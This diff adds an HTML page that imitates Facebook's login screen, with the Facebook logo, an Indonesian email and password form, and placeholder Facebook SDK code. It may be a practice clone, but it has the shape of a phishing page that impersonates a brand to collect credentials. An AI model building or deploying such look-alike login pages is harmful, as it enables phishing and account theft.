@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login with Facebook</title>
+    <link rel="icon" href="download__1_-removebg-preview.png" type="png/jpg" sizes="30x30" >
+    <style>
+        body{
+            background-color: #f0f2f5;
+            padding-bottom: 50px;
+        }
+        form{
+            width: 400px;
+            height: 300px;
+            margin: 0 auto;
+            border-radius: 8px ;
+            box-shadow: 2px 5px 3px rgba(0, 0, 0, 0.192);
+            padding: 18px 22px 18px 22px;
+            padding-bottom: 50px;
+            background-color: white;
+            display: block;
+            position: relative;
+            top: 150px;
+        }
+
+        input{
+                border-color:  rgba(0, 0, 0, 0.281);
+                border-radius: 6px;
+                width: 340px;
+                font-size: medium;
+                padding: 16px 14px 16px 30px;
+                margin: 10px;
+                outline: none;
+        }
+
+        input:hover{
+            border-color:#0866ff ;
+            border: solid 1px #0866ff;
+            box-shadow:0px 0px 4px 0px #618fda;
+            outline: none;
+        }
+
+        button{
+            width: 350px;
+            position:relative;
+            background-color: #0866ff ;
+            display: inline;
+            border: none;
+            padding: 15px 20px 15px 20px;
+            border-radius: 5px;
+            top: 30px;
+            left: 29px;
+            color: white;
+            font-size: 20px;
+        }
+        button:hover{
+            background-color:#1877f2 ;
+        }
+        h2{
+            text-align: center;
+            position: relative;
+            font-family:Arial, Helvetica, sans-serif;
+            color: rgba(0, 0, 0, 0.699);
+            font-size: 20px;
+        }
+        img{
+            display: inline-block;
+            position: relative;
+            left: 43%;
+            bottom: -120px;
+            height: 35px;
+        }
+
+        .router{
+            display: inline-block;
+            position: relative;
+            
+        }
+        .list li{
+            list-style: none;
+            outline: none;
+            margin:  0 auto;
+            
+        }
+        .list li a{
+            text-decoration: none;
+            left: 625px;
+            top: 200px;
+            text-align: center;
+            color: black ;
+            white-space: nowrap;
+            list-style-type: none;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            padding-bottom: 5px;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 13px;
+        }
+
+        .list li a:hover{
+            text-decoration: solid;
+            text-decoration-line:underline;
+        }
+        .footer{
+            top: 300px;
+            left: 30px;
+            position: relative;
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    
+    <img src="Facebook_logo_(2023).svg.png" alt="">
+    <!-- Form for email and password -->
+    <form class="loginform" method="get">
+        <h2> Login ke Facebook</h2>
+        <div>
+            <input type="email" id="email" name="email" placeholder="Email atau Nomor Telepon" required>
+        </div>
+        <div>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+        </div>
+        <div>
+            <button type="submit">Login</button>
+        </div>
+    </form>
+    <div>
+        <div class="router">
+            <div class="list" data-testid="list" data-nocookies="1">
+                <li><a href="#">Bahasa Indonesia</a></li>
+                <li><a href="#">English(UK)</a></li>
+                <li><a href="#">Bahasa Jawa</a></li>
+                <li><a href="#">Bahsa Melayu</a></li>
+                <li><a href="#">Francais(france)</a></li>
+                <li><a href="#">portugues(brasil)</a></li>
+                <li><a href="#">Deutsch</a></li>
+                <div class="footer">
+                    Meta2024
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Facebook login button -->
+    <div id="fbLoginButton"></div>
+
+    <!-- JavaScript to handle Facebook login -->
+    <script>
+        // Initialize the Facebook SDK
+        window.fbAsyncInit = function() {
+            FB.init({
+                appId      : 'YOUR_APP_ID',
+                cookie     : true,
+                xfbml      : true,
+                version    : 'v12.0'
+            });
+            
+            // Render Facebook login button
+            FB.getLoginStatus(function(response) {
+                if (response.status === 'connected') {
+                    // User is logged into Facebook and your app
+                    console.log('User already logged in');
+                } else {
+                    // User is not logged into Facebook, render login button
+                    renderLoginButton();
+                }
+            });
+        };
+
+        // Render Facebook login button
+        function renderLoginButton() {
+            FB.login(function(response) {
+                if (response.authResponse) {
+                    // User is logged in with Facebook
+                    console.log('User logged in');
+                    // You can now perform actions with the user's Facebook data
+                    // For example, fetch user information
+                    fetchUserInfo();
+                } else {
+                    // User cancelled login or did not authorize your app
+                    console.log('User cancelled login or did not authorize your app');
+                }
+            }, {scope: 'public_profile,email'});
+        }
+
+        // Fetch user information
+        function fetchUserInfo() {
+            FB.api('/me', {fields: 'name,email'}, function(response) {
+                console.log('User information:', response);
+                // You can now use the user information as needed
+                // For example, you can submit the user's email and Facebook ID to your server for login
+                // You may also want to redirect the user to a different page after successful login
+            });
+        }
+    </script>
+
+    <!-- Include the Facebook SDK -->
+    <script async defer crossorigin="anonymous" src="https://connect.facebook.net/en_US/sdk.js"></script>
+</body>
+</html>
